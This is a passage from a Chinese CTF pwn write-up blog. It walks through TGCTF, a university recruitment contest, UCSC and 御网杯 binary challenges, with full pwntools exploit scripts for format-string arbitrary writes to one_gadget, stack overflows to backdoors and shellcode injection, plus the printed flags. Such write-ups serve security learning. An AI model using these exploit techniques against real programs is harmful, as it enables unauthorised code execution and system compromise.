found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome TGCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your gift %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">1131796</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    magic = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会给我们一个栈上的地址，存在格式化字符漏洞但是只能利用一次，read很小无法溢出，所以只能尝试通过格式化字符漏洞任意写控制执行流构造二次输入，泄露libc基址，打one_gadget</p><p>通过gdb调试到存在格式化字符漏洞的printf处</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG6.png" alt="1"></p><p>可以发现printf的返回地址被放到了buf起始地址之前也就是buf - 8的位置返回地址为0x401276而read的地址是0x40123D将返回地址修改为read的地址即可构造二次输入</p><p>利用%n可以将目前输入的字符数覆盖到指定的地址，可以通过%hn写入 一个short类型的值覆盖两个字节，也可以通过%hhn写入一个  signed char   类型的值覆盖一个字节。返回地址与read地址之间只是低位有一个字节的区别两种方式均可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x401276   --&gt;   76 12 40 00</span><br><span class="line">0x40123D   --&gt;   3D 12 40 00</span><br></pre></td></tr></table></figure><p>选择使用%hn覆盖则需要输出0x123D个字节也就是4669个字节，使用%n覆盖返回地址还需指定地址，也就是前面题目给的栈地址-8注意参数具体是第几个。</p><p>两种写法：</p><p>单字节写入，格式化字符占0x18个字节在栈上也就是3个参数的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0</span>:<span class="string">&quot;%&#123;&#125;c%9$hhn%19$p&quot;</span>.<span class="built_in">format</span>(<span class="number">0x3D</span>),</span><br><span class="line">        <span class="number">0x18</span>:p64(stack - <span class="number">8</span>)  <span class="comment"># 修改 buf + 0x18 的值</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注：在指定参数时rdi是算格式字符也就是 format 而我们指定的参数是 arg ，arg1是存储在rsi中寄存器存储5个参数第6个参数位于栈上，我们格式化字符占了0x18个字节，p64(stack - 8)也就是栈上的第4个参数</p><p>双字节写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span> + <span class="string">b&quot;%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>控制过执行流后接收libc二次利用格式化字符漏洞将执行流转至one_gadget处看了gets大佬的wp又学到了新姿势</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>).encode()</span><br><span class="line">payload += (<span class="string">b&quot;c%10$hn%&quot;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - (one_gadget &amp; <span class="number">0xFFFF</span>)).encode())</span><br><span class="line">payload += <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span> + <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>这个payload最后是修改的部分是main函数末尾通过leave ret跳转到exit处将该地址利用任意写改成了one_gadget的地址</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/TG8.png" alt="1"></p><p>可以看到是stack地址加0x68处</p><p><code> str(one_gadget &amp; 0xFFFF).encode()</code>这部分是为了获取one_gadget的低16位并将低 16 位转换为字符串并编码为字节流</p><p><code> str(((one_gadget &gt;&gt; 16) &amp; 0xFFFF) - (one_gadget &amp; 0xFFFF)).encode())</code>将   one_gadget   右移 16 位，获取高 16 位的值接着计算高 16 位和低 16 位的差值，将差值转换为字符串并编码为字节流</p><p> <code>p64(stack + 0x68) </code> ：将   stack + 0x68   的地址转换为 8 字节的小端字节流。这个地址是低 16 位的写入目标。</p><p> <code>p64(stack + 0x68 + 2) </code>：将   stack + 0x68 + 2   的地址转换为 8 字节的小端字节流。这个地址是高 16 位的写入目标。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node1.tgctf.woooo.tech&#x27;,30480)</span></span><br><span class="line">io = process(</span><br><span class="line">    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span><br><span class="line">)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one =<span class="number">0xe3b01</span></span><br><span class="line">read=<span class="number">0x40123D</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your gift &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span> + <span class="string">b&quot;%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">one_gadget = one+base</span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>).encode()</span><br><span class="line">payload += (<span class="string">b&quot;c%10$hn%&quot;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>) - (one_gadget &amp; </span><br><span class="line"><span class="number">0xFFFF</span>)).encode())</span><br><span class="line">payload += <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span>)</span><br><span class="line">payload += p64(stack + <span class="number">0x68</span> + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;cat f*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>比赛的时候one_gadget版本太老了找到的和wp里的不一样就很难受</p><h4 id="process新姿势："><a href="#process新姿势：" class="headerlink" title="process新姿势："></a>process新姿势：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = process(</span><br><span class="line">    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="西南科大校队招新赛"><a href="#西南科大校队招新赛" class="headerlink" title="西南科大校队招新赛"></a>西南科大校队招新赛</h2><p>pwn01</p><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8090</span>)</span><br><span class="line">backdoor = <span class="number">0x080491F6</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>flag&#123;2732yg_cbhbc_999&#125;</code></p><p>pwn02</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8091</span>)</span><br><span class="line">target = <span class="number">0x0804C030</span></span><br><span class="line">payload= fmtstr_payload(<span class="number">4</span>,&#123;target:<span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>flag&#123;182hh_jsidj_28ddss&#125;</code></p><p>gift</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8094</span>)</span><br><span class="line">ret = <span class="number">0x400451</span></span><br><span class="line">gift  = <span class="number">0x4005C4</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(gift)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>flag&#123;gift_1s_4_v3ry_l0ng_fl4g_s3cur1ty_k3y5_ABCD1234!@#$&#125;</code></p><p>shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;47.113.227.111&#x27;</span>,<span class="number">8098</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;gift-&gt;&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf))</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) + p32(buf)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>flag&#123;m3ss4g3_1n_th3_b1n4ry_f1l3_0xDEADBEEF_1337&#125;</code></p><h2 id="UCSC"><a href="#UCSC" class="headerlink" title="UCSC"></a>UCSC</h2><h3 id="BoFido-ucsc"><a href="#BoFido-ucsc" class="headerlink" title="BoFido-ucsc"></a>BoFido-ucsc</h3><p>伪随机数，read处存在溢出可以覆盖种子，但无法直接覆盖v4，若种子固定则输出的随机数序列一定，循环十次若十次输入数字和随机数生成的一样即可获得shell</p><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the lottery game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now start your game!&quot;</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = rand() % <span class="number">255</span>;</span><br><span class="line">    v9 = rand() % <span class="number">255</span>;</span><br><span class="line">    v8 = rand() % <span class="number">255</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Round %d, please choose your numbers:\n&quot;</span>, i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v6, &amp;v5, &amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The lucky number is: %d %d %d\n&quot;</span>, v10, v9, v8);</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == v6 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v9 == v5 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == v4 )</span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the first prize!&quot;</span>);</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the second prize!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won the third prize!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You won nothing!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re so lucky! Here is your gift!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;See you next time!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将随机数种子覆盖为一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1</span><br></pre></td></tr></table></figure><p>0x20个a加上一个1</p><p>seed为1时生成10个随机数序列为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">171 153 203</span><br><span class="line">202 0 183</span><br><span class="line">201 70 206</span><br><span class="line">195 45 120</span><br><span class="line">165 188 58</span><br><span class="line">252 232 96</span><br><span class="line">178 16 144</span><br><span class="line">65 93 195</span><br><span class="line">202 99 159</span><br><span class="line">236 80 162</span><br></pre></td></tr></table></figure><p>依次输入即可</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/%E9%9A%8F%E6%9C%BA%E6%95%B0.png" alt="1"></p><h2 id="御网杯"><a href="#御网杯" class="headerlink" title="御网杯"></a>御网杯</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure><p>题目叫canary但是却没开canary，IDA反编译发现是用随机数模拟的</p><p>main函数附近藏了个后门函数<code>system(&#39;/bin/sh&#39;)</code></p><p>主要漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4013C7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  qword_4040D0 += rand();</span><br><span class="line">  v2 = qword_4040D0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret. Can you find it?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40135C();</span><br><span class="line">    v3 = sub_401397();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( qword_404088 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;My secret is %016lx\n&quot;</span>, qword_4040D0);</span><br><span class="line">          qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">          qword_4040D0 += rand();</span><br><span class="line">          v2 = qword_4040D0;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;But now, I have a new Secret.&quot;</span>);</span><br><span class="line">          --qword_404088;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Just one time!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Show me the code:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = qword_4040D0;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != qword_4040D0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, What are you doing?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，很简单的一题当时审代码没审仔细v2和qword_4040D0在最后会检查一次，如果不一致会结束运行导致无法用最后的leave 